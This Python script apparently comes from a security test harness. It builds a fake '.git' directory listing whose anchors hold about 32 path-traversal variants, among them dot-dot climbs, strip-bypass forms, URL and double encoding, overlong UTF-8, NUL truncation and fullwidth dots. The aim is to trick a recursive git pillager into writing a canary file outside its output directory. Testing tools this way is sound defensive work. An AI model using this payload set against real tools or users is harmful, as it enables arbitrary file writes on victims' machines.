"""Generate a payload that lures a recursive pillager into writing
outside its output directory via path-traversal anchors in a fake
HTML directory listing (justinsteven 2022, second PoC).

Layout served by evil_server:

    payload/
      .git/
        HEAD                # so the pillager treats this as a repo
        config              # innocent
        index.html          # the lure: many traversal-href variants
      canary/
        PWNED_C1            # what gets written to /canary/PWNED_C1
                            # if any of the traversal hrefs lands

The href set is comprehensive within the "relative dot-dot, write into
/canary" family, covering depth variants, the `....//` replace-bypass
class, layered relative paths, URL-encoded separators, percent-encoded
dots, backslash separators, path-parameter (`..;/`) tricks, double
URL-encoding, overlong-UTF-8 slashes, NUL truncation, and mixed /
fullwidth separators.  All target the same `/canary/PWNED_C1` so a
single canary check is enough — if any variant escapes, that file
appears.

Absolute-path payloads (a leading `/`, `//`, encoded `%2f`, backslash
roots) are a *different* primitive — the server hands the pillager an
absolute path rather than a relative climb — so they live in the
sibling ``C4_absolute_path_write`` scenario, which points them at the
mounted ``/canary`` so the escaping write is detectable.  Read-side
absolute reads (`file:///etc/passwd`) stay in C2.
"""

from __future__ import annotations

import shutil
from pathlib import Path

HERE = Path(__file__).resolve().parent
PAYLOAD = HERE / 'payload'

# Every href below targets /canary/PWNED_C1.  Any success creates the
# canary file and the default oracle flags FAIL.
HREFS = [
    # 1. Depth variants — historic justinsteven payloads.
    '../../canary/PWNED_C1',
    '../../../canary/PWNED_C1',
    '../../../../canary/PWNED_C1',
    '../../../../../canary/PWNED_C1',
    # 2. replace("..","") bypass family — survives a greedy
    #    non-overlapping ".." strip and still resolves to traversal.
    '....//canary/PWNED_C1',
    '....//.....//canary/PWNED_C1',
    '......//canary/PWNED_C1',
    '.....///canary/PWNED_C1',
    # 3. Layered: traversal mixed with a leading non-traversal segment.
    'x/../../canary/PWNED_C1',
    'foo/../../../canary/PWNED_C1',
    './../canary/PWNED_C1',
    'a/b/../../../canary/PWNED_C1',
    # 4. Double-slash variants — some normalisers collapse, some don't.
    '..//..//canary/PWNED_C1',
    '..///..///canary/PWNED_C1',
    # 5. Backslash separator — mostly Windows-relevant but exercises
    #    parsers that try to handle either separator.
    '..\\..\\canary\\PWNED_C1',
    # 6. URL-encoded separators.
    '..%2fcanary%2fPWNED_C1',
    '..%2f..%2fcanary%2fPWNED_C1',
    '..%5c..%5ccanary%5cPWNED_C1',
    # 7. URL-encoded dots.
    '%2e%2e/canary/PWNED_C1',
    '%2e%2e%2fcanary%2fPWNED_C1',
    '%2e%2e/%2e%2e/canary/PWNED_C1',
    # 8. Path-parameter trick — strips after `;` in some routers.
    '..;/canary/PWNED_C1',
    '..;foo=bar/canary/PWNED_C1',
    # 9. Double URL-encoding — survives a single decode pass; a tool that
    #    decodes twice (or decodes, stores, then decodes again) re-forms
    #    real separators and dots.
    '..%252fcanary%252fPWNED_C1',
    '%252e%252e%252fcanary%252fPWNED_C1',
    # 10. Overlong UTF-8 encodings of "/" (U+002F) — the classic
    #     lenient-decoder bypass; a strict UTF-8 decoder rejects them,
    #     an overlong-accepting one yields a separator.
    '..%c0%afcanary%c0%afPWNED_C1',
    '..%e0%80%afcanary%e0%80%afPWNED_C1',
    # 11. NUL truncation — a tool that terminates the path at a NUL keeps
    #     the traversal prefix and drops a trailing guard suffix (or the
    #     leading guard, depending on where it splits).
    '..%2f..%2fcanary%2fPWNED_C1%00.git',
    '..%00..%2fcanary%2fPWNED_C1',
    # 12. Mixed forward/back separators and fullwidth dots — normalisers
    #     that fold "\" -> "/" or NFKC-canonicalise fullwidth "．" re-form
    #     a "../" that a naive literal ".." check already waved through.
    '..\\/..\\/canary\\/PWNED_C1',
    '．．/canary/PWNED_C1',
]

_ANCHORS = '\n'.join(f'<a href="{h}">PWNED_C1</a>' for h in HREFS)
INDEX_HTML = (
    '<!DOCTYPE html>\n'
    '<html>\n'
    '<head><title>Index of /.git/</title></head>\n'
    '<body><h1>Index of /.git/</h1><hr><pre>\n'
    '<a href="HEAD">HEAD</a>\n'
    '<a href="config">config</a>\n'
    f'{_ANCHORS}\n'
    '</pre><hr></body></html>\n'
)

CONFIG = """[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tlogallrefupdates = true
"""


def main() -> None:
    if PAYLOAD.exists():
        shutil.rmtree(PAYLOAD)
    git_dir = PAYLOAD / '.git'
    git_dir.mkdir(parents=True)
    (git_dir / 'HEAD').write_text('ref: refs/heads/main\n')
    (git_dir / 'config').write_text(CONFIG)
    (git_dir / 'index.html').write_text(INDEX_HTML)

    canary_dir = PAYLOAD / 'canary'
    canary_dir.mkdir()
    (canary_dir / 'PWNED_C1').write_text('PWNED via HTML traversal anchor\n')

    print(f'Built C1 payload at {PAYLOAD} ({len(HREFS)} href variants)')


if __name__ == '__main__':
    main()
